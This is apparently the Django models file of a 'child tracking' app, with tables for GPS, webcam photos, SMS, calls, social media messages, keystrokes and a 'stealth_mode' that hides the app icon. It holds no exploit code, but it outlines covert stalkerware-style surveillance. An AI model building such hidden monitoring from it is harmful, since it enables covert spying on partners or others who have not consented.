"""Database models for the tracking application.

The previous version of this module contained many duplicated ``Meta``
definitions and ``save`` methods that referenced unrelated models.  This file
now defines each model once with clear fields and, where appropriate,
``UniqueConstraint`` validations to prevent duplicate records.
"""

from django.db import models
from django.contrib.auth.models import User


class Child(models.Model):
    """Represents a tracked child/device."""

    name = models.CharField(max_length=100)
    device_id = models.CharField(max_length=100, unique=True)
    parent = models.ForeignKey(User, on_delete=models.CASCADE)
    auth_token = models.CharField(max_length=64, blank=True, default="")
    safe_zone = models.TextField(
        blank=True, help_text="Optional: JSON defining safe zone coordinates"
    )
    update_interval = models.PositiveIntegerField(
        default=60, help_text="Update interval in seconds for tracking data"
    )

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"{self.name} ({self.device_id})"

    def latest_location(self):  # pragma: no cover - simple helper
        return self.locations.order_by("-timestamp").first()

    def latest_location_map_link(self):  # pragma: no cover - simple helper
        loc = self.latest_location()
        return (
            f"https://www.google.com/maps?q={loc.latitude},{loc.longitude}"
            if loc
            else None
        )


class LocationLog(models.Model):
    """Stores GPS tracking data."""

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="locations")
    timestamp = models.DateTimeField(auto_now_add=True)
    latitude = models.FloatField()
    longitude = models.FloatField()
    accuracy = models.FloatField(null=True, blank=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "latitude", "longitude", "timestamp"],
                name="unique_location_per_child_timestamp",
            )
        ]

    def save(self, *args, **kwargs):
        from django.core.exceptions import ValidationError

        if LocationLog.objects.filter(
            child=self.child,
            latitude=self.latitude,
            longitude=self.longitude,
            timestamp=self.timestamp,
        ).exclude(pk=self.pk).exists():
            raise ValidationError("Duplicate location log entry detected")
        super().save(*args, **kwargs)

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"{self.child.name} @ {self.timestamp}"


class IPLog(models.Model):
    """Stores IP address and network information."""

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="ip_logs")
    ip_address = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)
    details = models.TextField(blank=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "ip_address", "timestamp"],
                name="unique_ip_per_child_timestamp",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"{self.child.name} IP: {self.ip_address} at {self.timestamp}"


class DeviceInfoLog(models.Model):
    """Stores browser and device information."""

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="device_logs")
    timestamp = models.DateTimeField(auto_now_add=True)
    user_agent = models.TextField()
    platform = models.CharField(max_length=100)
    screen_width = models.IntegerField()
    screen_height = models.IntegerField()
    other_details = models.JSONField(blank=True, null=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "timestamp"],
                name="unique_device_info_per_child_timestamp",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"{self.child.name} device info at {self.timestamp}"


class PhotoCapture(models.Model):
    """Stores images captured from the webcam."""

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="photos")
    image = models.ImageField(upload_to="captures/")
    timestamp = models.DateTimeField(auto_now_add=True)
    latitude = models.FloatField(null=True, blank=True)
    longitude = models.FloatField(null=True, blank=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "timestamp"],
                name="unique_photo_per_child_timestamp",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"Photo for {self.child.name} at {self.timestamp}"


class SensorDataLog(models.Model):
    """Stores sensor data (accelerometer, gyroscope, etc.)."""

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="sensor_logs")
    timestamp = models.DateTimeField(auto_now_add=True)
    data = models.JSONField(blank=True, null=True, help_text="JSON data from sensors")

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "timestamp"],
                name="unique_sensor_per_child_timestamp",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"Sensor data for {self.child.name} at {self.timestamp}"


class PermissionLog(models.Model):
    """Stores permission statuses for various browser APIs."""

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="permission_logs")
    timestamp = models.DateTimeField(auto_now_add=True)
    geolocation = models.BooleanField(default=False)
    camera = models.BooleanField(default=False)
    microphone = models.BooleanField(default=False)
    notifications = models.BooleanField(default=False)
    clipboard = models.BooleanField(default=False)
    sensors = models.BooleanField(default=False)
    bluetooth = models.BooleanField(default=False)
    other = models.JSONField(
        blank=True, null=True, help_text="Additional permission statuses"
    )

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "timestamp"],
                name="unique_permission_per_child_timestamp",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"Permission log for {self.child.name} at {self.timestamp}"


class SMSLog(models.Model):
    """Logs SMS messages (sent/received)."""

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="sms_logs")
    timestamp = models.DateTimeField(auto_now_add=True)
    message = models.TextField()
    sender = models.CharField(max_length=100, blank=True)
    receiver = models.CharField(max_length=100, blank=True)
    direction = models.CharField(
        max_length=10, choices=[("sent", "Sent"), ("received", "Received")]
    )

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "message", "timestamp"],
                name="unique_sms_per_child_timestamp",
            )
        ]

    def save(self, *args, **kwargs):
        from django.core.exceptions import ValidationError

        if SMSLog.objects.filter(
            child=self.child, message=self.message, timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError("Duplicate SMS log entry detected")
        super().save(*args, **kwargs)

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"SMS ({self.direction}) for {self.child.name} at {self.timestamp}"


class SocialMediaMessage(models.Model):
    PLATFORMS = [
        ("whatsapp", "WhatsApp"),
        ("messenger", "Facebook Messenger"),
        ("instagram", "Instagram"),
        ("snapchat", "Snapchat"),
    ]

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="social_media_logs")
    platform = models.CharField(max_length=20, choices=PLATFORMS)
    timestamp = models.DateTimeField(auto_now_add=True)
    content = models.TextField()
    sender = models.CharField(max_length=100)
    attachment = models.FileField(upload_to="social_media/", null=True, blank=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "platform", "sender", "timestamp"],
                name="unique_social_message",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"{self.platform} message from {self.sender} at {self.timestamp}"


class CallLog(models.Model):
    CALL_TYPES = [
        ("incoming", "Incoming"),
        ("outgoing", "Outgoing"),
        ("missed", "Missed"),
    ]

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="call_logs")
    timestamp = models.DateTimeField(auto_now_add=True)
    number = models.CharField(max_length=20)
    duration = models.PositiveIntegerField(help_text="Call duration in seconds")
    type = models.CharField(max_length=10, choices=CALL_TYPES)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "number", "timestamp"],
                name="unique_call_per_child_timestamp",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"{self.type} call with {self.number} at {self.timestamp}"


class AppUsage(models.Model):
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="app_usage_logs")
    app_name = models.CharField(max_length=100)
    package_name = models.CharField(max_length=100)
    start_time = models.DateTimeField()
    end_time = models.DateTimeField()
    foreground_duration = models.PositiveIntegerField(help_text="Time in seconds")


class ScreenTime(models.Model):
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="screen_time_logs")
    date = models.DateField()
    total_duration = models.PositiveIntegerField(help_text="Total screen time in minutes")
    app_breakdown = models.JSONField(help_text="JSON of app usage durations")

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "date"],
                name="unique_screen_time_per_child_date",
            )
        ]


class GeofenceAlert(models.Model):
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="geofence_alerts")
    timestamp = models.DateTimeField(auto_now_add=True)
    triggered_type = models.CharField(
        max_length=10, choices=[("entry", "Entry"), ("exit", "Exit")]
    )
    latitude = models.FloatField()
    longitude = models.FloatField()
    radius = models.FloatField(help_text="Radius in meters")
    stealth_mode = models.BooleanField(
        default=False, help_text="Enable to hide app icon and run in background"
    )

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "latitude", "longitude", "timestamp"],
                name="unique_geofence_per_child_timestamp",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"Geofence {self.triggered_type} for {self.child.name} at {self.timestamp}"


class KeyloggerLog(models.Model):
    """Logs keystrokes (for demonstration only)."""

    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name="keylogger_logs")
    timestamp = models.DateTimeField(auto_now_add=True)
    keystrokes = models.TextField(help_text="Logged keystrokes")

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=["child", "timestamp"],
                name="unique_keylogger_per_child_timestamp",
            )
        ]

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"Keylogger entry for {self.child.name} at {self.timestamp}"


class AIJob(models.Model):
    name = models.CharField(max_length=100)
    status = models.CharField(max_length=20, default="pending")
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"{self.name} ({self.status})"


class InferenceRun(models.Model):
    """Records statistics for a model inference execution."""

    job = models.ForeignKey(AIJob, on_delete=models.CASCADE, related_name="runs")
    model_name = models.CharField(max_length=100)
    score = models.FloatField()
    latency_ms = models.FloatField()
    accuracy = models.FloatField(null=True, blank=True)
    drift = models.FloatField(null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self) -> str:  # pragma: no cover - simple representation
        return f"{self.model_name} run {self.id}"

